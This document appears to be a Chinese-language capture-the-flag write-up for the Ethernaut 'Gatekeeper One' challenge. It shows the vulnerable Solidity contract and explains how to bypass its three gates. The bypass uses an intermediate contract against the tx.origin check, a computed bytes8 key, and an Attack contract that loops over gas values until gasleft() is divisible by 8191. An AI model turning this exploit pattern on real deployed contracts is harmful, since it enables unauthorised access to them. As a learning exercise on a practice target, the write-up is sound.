#   Level 13 Gatekeeper One
實例地址：`0xA3B13A47FD5eE7BdFE9797c8d3e0cBF2bCDe6A90`

##  題目說明
跨越守衛的守衛並且註冊成為參賽者吧。

  可能會有用的資訊

*   回憶一下你在 Telephone 和 Token 關卡學到了什麼
*   可以去翻翻 Solidity 文件，更深入的了解一下 gasleft() 函式的資訊 (參見 Units and Global Variables 和 External Function Calls).
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

##  POC
這個合約需要破解三道需求即可，第一道解決方式只要使用另一個合約呼叫即可，第二道需要殘留的 `gas` 需要能和 8191 整除，第三道需要稍微計算一下，第一個要求後 2 byte 需要一樣，第二個要求全部不等於後 4 byte，第三個要求 地址末四位需要等於後 4 byte。

這邊使用暴力破解方式去解第二道，使用 i (1-8190) + 8191*3(預估使用值) 迴圈直到交易成功。

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attack{
    address public target;
    bytes8 public data=0xaaaaaaaa0000b0B6;
    
    constructor(address _target){
        target = _target;
    }

    function attack() external{
        for(uint256 i=0;i<8191;i++){
           (bool result,) = target.call{gas:i+8191*3}(abi.encodeWithSignature("enter(bytes8)", data));
        }
    }

}
```